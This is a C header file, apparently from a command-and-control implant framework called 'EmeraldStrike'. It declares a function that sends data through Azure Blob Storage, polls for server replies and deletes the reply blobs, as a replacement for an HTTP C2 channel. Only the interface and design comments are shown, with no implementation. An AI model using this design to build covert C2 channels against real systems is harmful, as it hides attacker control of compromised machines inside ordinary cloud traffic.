#ifndef EMERALDSTRIKE_TRANSPORT_AZURE_BLOB_H
#define EMERALDSTRIKE_TRANSPORT_AZURE_BLOB_H

#include "common.h"

// Azure Blob Storage transport (ats/sta polling). Drop-in replacement for
// http_post_response: submits `data` as a new ats/{message-id}.blob, polls
// sta/{message-id}.blob until the server posts the reply, deletes the reply
// blob and returns its contents (raw base64 text, exactly like the HTTP C2
// profile returns). The message-id is a fresh v4 GUID per call.
BOOL blob_post_response(PINSTANCE inst, BYTE* data, DWORD data_len,
                        BYTE** response, DWORD* resp_len);

#endif
